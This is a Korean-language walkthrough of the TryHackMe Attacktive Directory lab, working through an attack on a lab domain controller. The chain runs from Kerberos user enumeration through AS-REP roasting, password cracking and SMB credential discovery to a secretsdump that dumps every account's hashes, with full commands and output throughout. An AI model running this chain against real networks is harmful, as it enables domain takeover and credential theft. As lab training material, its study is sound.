10.10.107.58

# nmap

nmap -sV -sC -Pn -T4 --open -oN namp.scan.txt 10.10.107.58

Nmap scan report for 10.10.107.58
Host is up (0.29s latency).
Not shown: 986 closed tcp ports (reset)
PORT STATE SERVICE VERSION
53/tcp open domain Simple DNS Plus
80/tcp open http Microsoft IIS httpd 10.0
| http-methods:
|_ Potentially risky methods: TRACE
|\_http-title: IIS Windows Server
88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2025-07-02 14:16:14Z)
135/tcp open msrpc Microsoft Windows RPC
139/tcp open netbios-ssn Microsoft Windows netbios-ssn
389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
445/tcp open microsoft-ds?
464/tcp open kpasswd5?
593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0
636/tcp open tcpwrapped
3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
3269/tcp open tcpwrapped
3389/tcp open ms-wbt-server Microsoft Terminal Services
|\_ssl-date: 2025-07-02T14:16:45+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=AttacktiveDirectory.spookysec.local
| Not valid before: 2025-07-01T13:50:02
|\_Not valid after: 2025-12-31T13:50:02
| rdp-ntlm-info:
| Target_Name: THM-AD
| NetBIOS_Domain_Name: THM-AD
| NetBIOS_Computer_Name: ATTACKTIVEDIREC
| DNS_Domain_Name: spookysec.local
| DNS_Computer_Name: AttacktiveDirectory.spookysec.local
| Product_Version: 10.0.17763
|_ System_Time: 2025-07-02T14:16:35+00:00
5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|\_http-server-header: Microsoft-HTTPAPI/2.0
|\_http-title: Not Found
Service Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
| 3:1:1:
|_ Message signing enabled and required
| smb2-time:
| date: 2025-07-02T14:16:38
|_ start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

Nmap은 네트워크 스캐닝 도구로, 호스트와 네트워크 서비스에 대한 정보를 수집하는 데 사용됩니다. 제공된 Nmap 스캔 결과는 IP 주소 `10.10.107.58`에 대한 상세한 스캔 결과를 보여줍니다. 각 포트와 서비스에 대한 정보를 분석하면 다음과 같습니다:

1. 53/tcp: DNS 서비스 (Simple DNS Plus)가 열려 있습니다. DNS는 도메인 이름을 IP 주소로 변환하는 데 사용됩니다.

2. 80/tcp: HTTP 서비스 (Microsoft IIS httpd 10.0)가 열려 있습니다. 웹 서버로 사용되며, `TRACE` 메서드가 잠재적으로 위험할 수 있음을 나타냅니다.

3. 88/tcp: Kerberos 보안 서비스 (Microsoft Windows Kerberos)가 열려 있습니다. Kerberos는 네트워크 인증 프로토콜로 사용됩니다.

4. 135/tcp: Microsoft Windows RPC (Remote Procedure Call) 서비스가 열려 있습니다. RPC는 원격 시스템에서 프로시저를 실행하는 데 사용됩니다.

5. 139/tcp: NetBIOS 서비스 (Microsoft Windows netbios-ssn)가 열려 있습니다. NetBIOS는 네트워크에서 통신을 관리하는 데 사용됩니다.

6. 389/tcp: LDAP 서비스 (Microsoft Windows Active Directory LDAP)가 열려 있습니다. LDAP는 디렉토리 서비스를 제공하는 데 사용됩니다.

7. 445/tcp: Microsoft-DS 서비스가 열려 있습니다. 이 포트는 SMB (Server Message Block) 프로토콜과 관련이 있습니다.

8. 464/tcp: Kerberos 비밀번호 변경 서비스 (kpasswd5)가 열려 있습니다.

9. 593/tcp: RPC over HTTP 서비스가 열려 있습니다. 이 서비스는 원격 프로시저 호출을 HTTP를 통해 수행합니다.

10. 636/tcp: TCP 래핑된 서비스가 열려 있습니다. 일반적으로 LDAPS (LDAP over SSL)에 사용됩니다.

11. 3268/tcp: LDAP 서비스 (Microsoft Windows Active Directory LDAP)가 열려 있습니다. 이 포트는 글로벌 카탈로그에 사용됩니다.

12. 3269/tcp: TCP 래핑된 서비스가 열려 있습니다. 일반적으로 LDAPS에 사용됩니다.

13. 3389/tcp: Microsoft Terminal Services (RDP)가 열려 있습니다. 원격 데스크톱 연결에 사용됩니다.

14. 5985/tcp: HTTP 서비스 (Microsoft HTTPAPI httpd 2.0)가 열려 있습니다. SSDP/UPnP와 관련이 있습니다.

호스트 정보:

- 호스트 이름: `ATTACKTIVEDIREC`
- netbios 도메인 이름: `THM-AD`
- 운영 체제: Windows
- DNS 도메인 이름: `spookysec.local`

추가 정보:

- SMB2 보안 모드: 메시지 서명 활성화 및 필요
- 시스템 시간: 2025-07-02T14:16:38

이 스캔 결과는 대상 시스템이 Windows 기반이며, 다양한 네트워크 서비스를 실행 중임을 보여줍니다. 특히 Active Directory와 관련된 서비스들이 많이 열려 있어, 이 시스템이 도메인 컨트롤러로 사용될 가능성이 높습니다.

# /etc/hosts

10.10.107.58 spookysec.local

# enum4linux

apt install enum4linux

# dnsutils

sudo apt install dnsutils

# bloodhound + neo4j

sudo apt install bloodhound
sudo apt install neo4j

sudo neo4j console

# enum4linux

(kali㉿vbox)-[~]
└─$ sudo enum4linux -a 10.10.107.58
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sun Jul 6 03:45:13 2025

=========================================( Target Information )=========================================

Target ........... 10.10.107.58
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none

============================( Enumerating Workgroup/Domain on 10.10.107.58 )============================

[E] Can't find workgroup/domain

================================( Nbtstat Information for 10.10.107.58 )================================

Looking up status of 10.10.107.58
No reply from 10.10.107.58

===================================( Session Check on 10.10.107.58 )===================================

[+] Server 10.10.107.58 allows sessions using username '', password ''

================================( Getting domain SID for 10.10.107.58 )================================

Domain Name: THM-AD  
Domain Sid: S-1-5-21-3591857110-2884097990-301047963

[+] Host is part of a domain (not a workgroup)

===================================( OS information on 10.10.107.58 )===================================

[E] Can't get OS info with smbclient

[+] Got OS info for 10.10.107.58 from srvinfo:  
do_cmd: Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED

=======================================( Users on 10.10.107.58 )=======================================

[E] Couldn't find users using querydispinfo: NT_STATUS_ACCESS_DENIED

[E] Couldn't find users using enumdomusers: NT_STATUS_ACCESS_DENIED

=================================( Share Enumeration on 10.10.107.58 )=================================

do_connect: Connection to 10.10.107.58 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)

        Sharename       Type      Comment
        ---------       ----      -------

Reconnecting with SMB1 for workgroup listing.
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 10.10.107.58

============================( Password Policy Information for 10.10.107.58 )============================

[E] Unexpected error from polenum:

[+] Attaching to 10.10.107.58 using a NULL share

[+] Trying protocol 139/SMB...

        [!] Protocol failed: Cannot request session (Called Name:10.10.107.58)

[+] Trying protocol 445/SMB...

        [!] Protocol failed: SAMR SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.

[E] Failed to get password policy with rpcclient

=======================================( Groups on 10.10.107.58 )=======================================

[+] Getting builtin groups:

[+] Getting builtin group memberships:

[+] Getting local groups:

[+] Getting local group memberships:

[+] Getting domain groups:

[+] Getting domain group memberships:

==================( Users on 10.10.107.58 via RID cycling (RIDS: 500-550,1000-1050) )==================

[I] Found new SID:  
S-1-5-21-3591857110-2884097990-301047963

[I] Found new SID:  
S-1-5-21-3591857110-2884097990-301047963

[+] Enumerating users using SID S-1-5-21-3532885019-1334016158-1514108833 and logon username '', password ''

S-1-5-21-3532885019-1334016158-1514108833-500 ATTACKTIVEDIREC\Administrator (Local User)  
S-1-5-21-3532885019-1334016158-1514108833-501 ATTACKTIVEDIREC\Guest (Local User)
S-1-5-21-3532885019-1334016158-1514108833-503 ATTACKTIVEDIREC\DefaultAccount (Local User)
S-1-5-21-3532885019-1334016158-1514108833-504 ATTACKTIVEDIREC\WDAGUtilityAccount (Local User)
S-1-5-21-3532885019-1334016158-1514108833-513 ATTACKTIVEDIREC\None (Domain Group)

[+] Enumerating users using SID S-1-5-21-3591857110-2884097990-301047963 and logon username '', password ''

S-1-5-21-3591857110-2884097990-301047963-500 THM-AD\Administrator (Local User)  
S-1-5-21-3591857110-2884097990-301047963-501 THM-AD\Guest (Local User)
S-1-5-21-3591857110-2884097990-301047963-502 THM-AD\krbtgt (Local User)
S-1-5-21-3591857110-2884097990-301047963-512 THM-AD\Domain Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-513 THM-AD\Domain Users (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-514 THM-AD\Domain Guests (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-515 THM-AD\Domain Computers (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-516 THM-AD\Domain Controllers (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-517 THM-AD\Cert Publishers (Local Group)
S-1-5-21-3591857110-2884097990-301047963-518 THM-AD\Schema Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-519 THM-AD\Enterprise Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-520 THM-AD\Group Policy Creator Owners (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-521 THM-AD\Read-only Domain Controllers (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-522 THM-AD\Cloneable Domain Controllers (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-525 THM-AD\Protected Users (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-526 THM-AD\Key Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-527 THM-AD\Enterprise Key Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-1000 THM-AD\ATTACKTIVEDIREC$ (Local User)

===============================( Getting printer info for 10.10.107.58 )===============================

do_cmd: Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED

enum4linux complete on Sun Jul 6 04:04:05 2025

# 결과 분석

각 줄은 Windows 시스템에서 사용되는 보안 식별자(SID)와 해당 SID에 연결된 사용자 또는 그룹 계정을 나타냅니다. 각 요소는 다음과 같은 형식으로 구성되어 있습니다:

```
S-1-5-21-<도메인 식별자>-<RID> <도메인 이름>\<계정 이름> (<계정 유형>)
```

각 필드를 설명하면 다음과 같습니다:

1. S-1-5-21-3591857110-2884097990-301047963:

   - 설명: 이 부분은 SID의 기본 구조를 나타냅니다. `S-1-5-21`은 Windows 시스템에서 도메인 사용자 및 그룹을 식별하는 데 사용되는 표준 접두사입니다. 그 뒤에 오는 숫자(`3591857110-2884097990-301047963`)는 해당 도메인을 고유하게 식별합니다.

2. -<RID>:

   - 설명: Relative Identifier(RID)는 SID의 마지막 부분으로, 특정 사용자 또는 그룹을 고유하게 식별합니다. 예를 들어, `500`은 일반적으로 관리자 계정을 나타냅니다.

3. <도메인 이름>:

   - 설명: 이 부분은 사용자 또는 그룹이 속한 도메인의 이름을 나타냅니다. 예제에서는 `THM-AD`가 도메인 이름으로 사용되었습니다.

4. <계정 이름>:

   - 설명: 이 부분은 사용자 또는 그룹의 이름을 나타냅니다. 예를 들어, `Administrator`, `Guest`, `Domain Admins` 등이 있습니다.

5. (<계정 유형>):
   - 설명: 이 부분은 계정의 유형을 나타냅니다. `Local User`는 로컬 사용자 계정을, `Domain Group`은 도메인 그룹을 나타냅니다.

# Kerberos Enumeration

# 설치

wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64 -O kerbrute
chmod +x kerbrute
sudo mv kerbrute /usr/local/bin/
apt install golang

# 실행

dc: 도메인 컨트롤러의 IP 주소
d: 도메인 이름 (spookysec.local)
o: 결과를 저장할 파일 이름 (found_users.txt)
t: 스레드 수 (동시 요청 수, 기본값은 10)

kerbrute userenum --dc 10.10.107.58 -d spookysec.local -t 100 userlist.txt

    __             __               __

/ /\_ \_/ /\_ \_\_\_ / /\_\_
/ //_/ _ \/ \_/  \/ \_/ / / / / _ \
 / ,< / \_\_/ / / /_/ / / / /_/ / /_/ /
/_/|_|\_/_/ /_._/_/ \__,_/\_\_/\_/

Version: dev (n/a) - 07/06/25 - Ronnie Flathers @ropnop

2025/07/06 06:55:59 > Using KDC(s):
2025/07/06 06:55:59 > 10.10.107.58:88

2025/07/06 06:55:59 > [+] VALID USERNAME: james@spookysec.local
2025/07/06 06:56:00 > [+] svc-admin has no pre auth required. Dumping hash to crack offline:
$krb5asrep$18$svc-admin@SPOOKYSEC.LOCAL:eb7960f3000af4f080ea83a3bfcecf85$72c40a3cb926c5f8b3cc13cef014f763655df20a11bc61d3906484b260bda7671bf741abdc92c4f7b1c2bdaa56519a04890dc47f428075619a71ebae1bb8577199b14a9c9032fff2027e12d432e07f7ec2b764942855aeeaeafedd9347900404fd3e8c27b363d2380cb22803315fb27177d07535b38f1099eac31da01b94ace1e0f40009679329bba6e44a35dba35ab0edcd397ae6604fd0430182417d54bc99ed5141846d60249be0e2bd0153d69e6d12963e799dbf0ad6582e318e8d015b274e58af153c4ac5918c0235537720320d245fb927b222f9f47f41c1d4a08d4bc927081fc751c61f27e50f0167f171d0d4b42dc6aa159104c0d3ae404caeb12b646b1b7474cd98  
2025/07/06 06:56:00 > [+] VALID USERNAME: svc-admin@spookysec.local
2025/07/06 06:56:01 > [+] VALID USERNAME: James@spookysec.local
2025/07/06 06:56:01 > [+] VALID USERNAME: robin@spookysec.local
2025/07/06 06:56:04 > [+] VALID USERNAME: darkstar@spookysec.local
2025/07/06 06:56:06 > [+] VALID USERNAME: administrator@spookysec.local
2025/07/06 06:56:10 > [+] VALID USERNAME: backup@spookysec.local
2025/07/06 06:56:11 > [+] VALID USERNAME: paradox@spookysec.local
2025/07/06 06:56:21 > [+] VALID USERNAME: JAMES@spookysec.local
2025/07/06 06:56:25 > [+] VALID USERNAME: Robin@spookysec.local
2025/07/06 06:56:47 > [+] VALID USERNAME: Administrator@spookysec.local
2025/07/06 06:57:30 > [+] VALID USERNAME: Darkstar@spookysec.local
2025/07/06 06:57:44 > [+] VALID USERNAME: Paradox@spookysec.local
2025/07/06 06:58:30 > [+] VALID USERNAME: DARKSTAR@spookysec.local
2025/07/06 06:58:44 > [+] VALID USERNAME: ori@spookysec.local
2025/07/06 06:59:09 > [+] VALID USERNAME: ROBIN@spookysec.local
2025/07/06 07:00:12 > Done! Tested 73317 usernames (16 valid) in 252.886 seconds

# svc-admin 계정은 Pre-Auth가 필요하지 않으므로 AS-REP Roasting이 가능합니다. 이 계정의 해시를 오프라인에서 크랙할 수 있습니다.

$krb5asrep$<etype>$<username>:<checksum>$<encrypted blob>

| 항목                               | 내용                                  | 설명                                                  |
| ---------------------------------- | ------------------------------------- | ----------------------------------------------------- |
| `$krb5asrep$`                      | 고정 접두어                           | 해시 타입 식별자 (AS-REP Roasting용)                  |
| `18`                               | 암호화 알고리즘 (etype)               | `18 = aes256-cts-hmac-sha1-96`<br> → AES 256-bit 사용 |
| `svc-admin@SPOOKYSEC.LOCAL`        | 사용자 Principal 이름                 | 공격 대상 사용자                                      |
| `eb7960f3000af4f080ea83a3bfcecf85` | 체크섬 (Checksum)                     | 티켓 데이터의 무결성 검사용 (크랙에는 필요 없음)      |
| `72c4...cd98`                      | 암호화된 데이터 (Encrypted Data Blob) | 실제로 크랙 대상이 되는 부분                          |

# impacket 사용

sudo apt update
sudo apt install python3-pip python3-venv -y

python3 -m venv impacket-env
source impacket-env/bin/activate

git clone https://github.com/fortra/impacket.git
cd impacket

pip install -r requirements.txt
python3 setup.py install

cd impacket/examples

# username 하나씩 넣어보면서 AS-REP Roasting 가능한지 확인

python3 GetNPUsers.py spookysec.local/USERNAME -no-pass -dc-ip 10.10.107.58
python3 GetNPUsers.py spookysec.local/svc-admin -no-pass -dc-ip 10.10.107.58

# backup 계정도 보통 권한이 높은 경우가 많으므로 확인 필요

# get TGT

┌──(impacket-env)─(kali㉿vbox)-[~/impacket/examples]
└─$ python3 GetNPUsers.py spookysec.local/svc-admin -no-pass
/home/kali/impacket-env/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
import pkg_resources
Impacket v0.13.0.dev0+20250702.182415.b33e994d - Copyright Fortra, LLC and its affiliated companies

[*] Getting TGT for svc-admin
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:c5bdd5ab26d92c6f285bcc6d298177cc$90400cd95569b00649925f20b7462f510c4bf7928fc8704eee5c9add8febc9ad1cc4b63ad9aae1c2c66bc0fb5711d975ee4245cee843bb89cc04f0e7b1728e1ce84cb61feaaf8a7d5a5bdb83e1be7647fea8fb807e10228f25e424be86dec12edb634af6d4a08399fc921a0e062fa72de2095774ea0885ada3c5ca2392ec75f0606f53b181bcf03aae3d0efd337782322aa7c828445a7834402c0a931259e18010dccce3f54a04e40fb37fe6b5e7962ce9f4074f33a42d9a354079c3c8b07c0bef4fef7af65437b0b93bb0810bae9eb407cf962552dcef42e43688e6a5cb8544c3bc4ae854cfa1da1a14088ffae1fa1f7b1b

$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:<암호화된 해시>

# crack hash

# 특이하게 해시 크랙시 해당 행 전체를 넣어야 합니다.

# 예시: $krb5asrep$23$svc-admin@SPOOK~

hashcat -m 18200 -a 0 -o cracked.txt --remove hashes.txt /usr/share/wordlists/rockyou.txt

john 해시파일

┌──(impacket-env)─(kali㉿vbox)-[~]
└─$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 ASIMD 4x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
management2005 ($krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL)  
1g 0:00:00:00 DONE (2025-07-06 08:44) 50.00g/s 409600p/s 409600c/s 409600C/s newzealand..whitey
Use the "--show" option to display all of the cracked passwords reliably
Session completed.

# management2005 비밀번호 획득

# smbclient

apt install smbclient

smbclient -k -L spookysec.local -U svc-admin%management2005

# -k 옵션은 사라졌습니다. 대신 -U 옵션을 사용하여 사용자 이름과 비밀번호를 지정합니다.

-L : 도메인 컨트롤러의 공유 목록을 나열합니다.
-k : Kerberos 인증을 사용합니다.
-U : 사용자 이름과 비밀번호를 지정합니다.

smbclient -L spookysec.local -U svc-admin%management2005

# smbclient SMB 공유에 접근

┌──(impacket-env)─(kali㉿vbox)-[~/kerbrute]
└─$ smbclient -L spookysec.local -U svc-admin%management2005

Sharename Type Comment

---

ADMIN$ Disk Remote Admin
backup Disk
C$ Disk Default share
IPC$ IPC Remote IPC
NETLOGON Disk Logon server share
SYSVOL Disk Logon server share
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to spookysec.local failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

# 결과 분석

| Sharename  | Type | 설명                                                   |
| ---------- | ---- | ------------------------------------------------------ |
| `ADMIN$`   | Disk | 관리자용 숨김 공유 (원격 관리용)                       |
| `backup`   | Disk | 이름상 중요한 데이터 저장소 가능성 있음 🔥         |
| `C$`       | Disk | 기본 시스템 드라이브 (숨김 공유)                       |
| `IPC$`     | IPC  | 인터프로세스 통신용 파이프 (보통 익스플로잇 대상 아님) |
| `NETLOGON` | Disk | 로그인 스크립트, GPO 관련 공유 (AD 환경에서 사용)      |
| `SYSVOL`   | Disk | GPO, 스크립트 등 Group Policy 공유 (AD 구성 시 중요)   |

# backup 공유에 접근 시도 성공

┌──(root㉿docker-desktop)-[/]
└─# smbclient \\\\spookysec.local\\backup -U svc-admin
Password for [WORKGROUP\svc-admin]:
Try "help" to get a list of possible commands.
smb: \>

# ls -> 백업 파일 확인

smb: \>ls
. D 0 Sat Apr 4 19:08:39 2020
.. D 0 Sat Apr 4 19:08:39 2020
backup_credentials.txt A 48 Sat Apr 4 19:08:53 2020

    	8247551 blocks of size 4096. 3968429 blocks available

smb: \>

# get backup_credentials.txt -> 다운로드 크리덴셜 파일

get backup_credentials.txt
getting file \backup_credentials.txt of size 48 as backup_credentials.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
smb: \>

# 다운로드 확인

┌──(root㉿docker-desktop)-[/]
└─# ls
backup_credentials.txt bin boot data dev etc home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var vpn

┌──(root㉿docker-desktop)-[/]
└─# cat backup_credentials.txt
YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw

# base64 -> 크랙킹 -> 사실상 컨버팅

┌──(root㉿docker-desktop)-[/]
└─# echo YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw | base64 -d
backup@spookysec.local:backup2517860

계정 : backup@spookysec.local
비밀번호 : backup2517860

# 얻은 정보로 다시 재접근 -> 로그인 시 도메인은 생략

smbclient -L spookysec.local -U backup%backup2517860

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        backup          Disk
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share
        SYSVOL          Disk      Logon server share

Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to spookysec.local failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

# 직접 공유 폴더로 접근 -> 접근 불가

smbclient //spookysec.local/backup -U backup%backup2517860

smb: \>ls
NT_STATUS_ACCESS_DENIED listing \*
smb: \>

# NETLOGON 공유 폴더 접근 시도 -> 실패

smbclient //spookysec.local/NETLOGON -U backup%backup2517860

# SYSVOL 공유 폴더 접근 시도 -> 실패

smbclient //spookysec.local/SYSVOL -U backup%backup2517860

# Elevating Privileges 시작

# 필요한 패키지 설치 -> impacket 설치 -> 윈도우 공격 도구 모음 python

apt update
apt install -y python3 python3-pip python3-venv build-essential git

# impacket GitHub에서 다운로드 -> 이동 -> venv 환경 설정 -> 공격 실행

git clone https://github.com/fortra/impacket.git
cd impacket

1. `python3 -m venv test`

   - 설명: `test`라는 이름의 파이썬 가상환경 생성
   - 필수: O
   - 파라미터: 디렉토리명 (`test`)

2. `source test/bin/activate`

   - 설명: `test` 가상환경 활성화
   - 필수: O
   - 파라미터: 없음

3. `pip install --upgrade pip`

   - 설명: pip 최신 버전으로 업그레이드
   - 필수: O
   - 파라미터: 없음

4. `pip install .`

   - 설명: 현재 디렉토리(`.`)에 있는 impacket 패키지 설치
   - 필수: O

5. `python examples/secretsdump.py -h`

# 가상환경 프롬프트 설명

- `(test)` : 현재 활성화된 파이썬 가상환경 이름.  
  → `source test/bin/activate` 실행 시 프롬프트 앞에 표시됨.

- `[impenv]` : 현재 작업 중인 디렉토리 경로.  
  → `pwd` 명령어로 확인 가능.  
  → 예시: `/impenv` 디렉토리에서 작업 중이면 `[impenv]`로 표시됨.

- `deactivate` : 가상환경 나가기

  10.10.107.58

smbclient -L spookysec.local -U svc-admin%management2005
smbclient //spookysec.local/SYSVOL -U backup%backup2517860

```bash
python3 /impacket/examples/secretsdump.py -dc-ip 10.10.107.58 -target-ip 10.10.107.58 backup@spookysec.local:backup2517860


──(test)(root㉿docker-desktop)-[/impacket]
└─# python3 /impacket/examples/secretsdump.py -dc-ip 10.10.107.58 -target-ip 10.10.107.58 backup@spookysec.local:backup2517860
/impacket/test/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
import pkg_resources
Impacket v0.13.0.dev0+20250707.152659.a60a1f17 - Copyright Fortra, LLC and its affiliated companies

Password:
[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::
spookysec.local\skidy:1103:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
spookysec.local\breakerofthings:1104:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
spookysec.local\james:1105:aad3b435b51404eeaad3b435b51404ee:9448bf6aba63d154eb0c665071067b6b:::
spookysec.local\optional:1106:aad3b435b51404eeaad3b435b51404ee:436007d1c1550eaf41803f1272656c9e:::
spookysec.local\sherlocksec:1107:aad3b435b51404eeaad3b435b51404ee:b09d48380e99e9965416f0d7096b703b:::
spookysec.local\darkstar:1108:aad3b435b51404eeaad3b435b51404ee:cfd70af882d53d758a1612af78a646b7:::
spookysec.local\Ori:1109:aad3b435b51404eeaad3b435b51404ee:c930ba49f999305d9c00a8745433d62a:::
spookysec.local\robin:1110:aad3b435b51404eeaad3b435b51404ee:642744a46b9d4f6dff8942d23626e5bb:::
spookysec.local\paradox:1111:aad3b435b51404eeaad3b435b51404ee:048052193cfa6ea46b5a302319c0cff2:::
spookysec.local\Muirland:1112:aad3b435b51404eeaad3b435b51404ee:3db8b1419ae75a418b3aa12b8c0fb705:::
spookysec.local\horshark:1113:aad3b435b51404eeaad3b435b51404ee:41317db6bd1fb8c21c2fd2b675238664:::
spookysec.local\svc-admin:1114:aad3b435b51404eeaad3b435b51404ee:fc0f1e5359e372aa1f69147375ba6809:::
spookysec.local\backup:1118:aad3b435b51404eeaad3b435b51404ee:19741bde08e135f4b40f1ca9aab45538:::
spookysec.local\a-spooks:1601:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
ATTACKTIVEDIREC$:1000:aad3b435b51404eeaad3b435b51404ee:af787351cc368d23156d369b9fabb386:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:713955f08a8654fb8f70afe0e24bb50eed14e53c8b2274c0c701ad2948ee0f48
Administrator:aes128-cts-hmac-sha1-96:e9077719bc770aff5d8bfc2d54d226ae
Administrator:des-cbc-md5:2079ce0e5df189ad
krbtgt:aes256-cts-hmac-sha1-96:b52e11789ed6709423fd7276148cfed7dea6f189f3234ed0732725cd77f45afc
krbtgt:aes128-cts-hmac-sha1-96:e7301235ae62dd8884d9b890f38e3902
krbtgt:des-cbc-md5:b94f97e97fabbf5d
spookysec.local\skidy:aes256-cts-hmac-sha1-96:3ad697673edca12a01d5237f0bee628460f1e1c348469eba2c4a530ceb432b04
spookysec.local\skidy:aes128-cts-hmac-sha1-96:484d875e30a678b56856b0fef09e1233
spookysec.local\skidy:des-cbc-md5:b092a73e3d256b1f
spookysec.local\breakerofthings:aes256-cts-hmac-sha1-96:4c8a03aa7b52505aeef79cecd3cfd69082fb7eda429045e950e5783eb8be51e5
spookysec.local\breakerofthings:aes128-cts-hmac-sha1-96:38a1f7262634601d2df08b3a004da425
spookysec.local\breakerofthings:des-cbc-md5:7a976bbfab86b064
spookysec.local\james:aes256-cts-hmac-sha1-96:1bb2c7fdbecc9d33f303050d77b6bff0e74d0184b5acbd563c63c102da389112
spookysec.local\james:aes128-cts-hmac-sha1-96:08fea47e79d2b085dae0e95f86c763e6
spookysec.local\james:des-cbc-md5:dc971f4a91dce5e9
spookysec.local\optional:aes256-cts-hmac-sha1-96:fe0553c1f1fc93f90630b6e27e188522b08469dec913766ca5e16327f9a3ddfe
spookysec.local\optional:aes128-cts-hmac-sha1-96:02f4a47a426ba0dc8867b74e90c8d510
spookysec.local\optional:des-cbc-md5:8c6e2a8a615bd054
spookysec.local\sherlocksec:aes256-cts-hmac-sha1-96:80df417629b0ad286b94cadad65a5589c8caf948c1ba42c659bafb8f384cdecd
spookysec.local\sherlocksec:aes128-cts-hmac-sha1-96:c3db61690554a077946ecdabc7b4be0e
spookysec.local\sherlocksec:des-cbc-md5:08dca4cbbc3bb594
spookysec.local\darkstar:aes256-cts-hmac-sha1-96:35c78605606a6d63a40ea4779f15dbbf6d406cb218b2a57b70063c9fa7050499
spookysec.local\darkstar:aes128-cts-hmac-sha1-96:461b7d2356eee84b211767941dc893be
spookysec.local\darkstar:des-cbc-md5:758af4d061381cea
spookysec.local\Ori:aes256-cts-hmac-sha1-96:5534c1b0f98d82219ee4c1cc63cfd73a9416f5f6acfb88bc2bf2e54e94667067
spookysec.local\Ori:aes128-cts-hmac-sha1-96:5ee50856b24d48fddfc9da965737a25e
spookysec.local\Ori:des-cbc-md5:1c8f79864654cd4a
spookysec.local\robin:aes256-cts-hmac-sha1-96:8776bd64fcfcf3800df2f958d144ef72473bd89e310d7a6574f4635ff64b40a3
spookysec.local\robin:aes128-cts-hmac-sha1-96:733bf907e518d2334437eacb9e4033c8
spookysec.local\robin:des-cbc-md5:89a7c2fe7a5b9d64
spookysec.local\paradox:aes256-cts-hmac-sha1-96:64ff474f12aae00c596c1dce0cfc9584358d13fba827081afa7ae2225a5eb9a0
spookysec.local\paradox:aes128-cts-hmac-sha1-96:f09a5214e38285327bb9a7fed1db56b8
spookysec.local\paradox:des-cbc-md5:83988983f8b34019
spookysec.local\Muirland:aes256-cts-hmac-sha1-96:81db9a8a29221c5be13333559a554389e16a80382f1bab51247b95b58b370347
spookysec.local\Muirland:aes128-cts-hmac-sha1-96:2846fc7ba29b36ff6401781bc90e1aaa
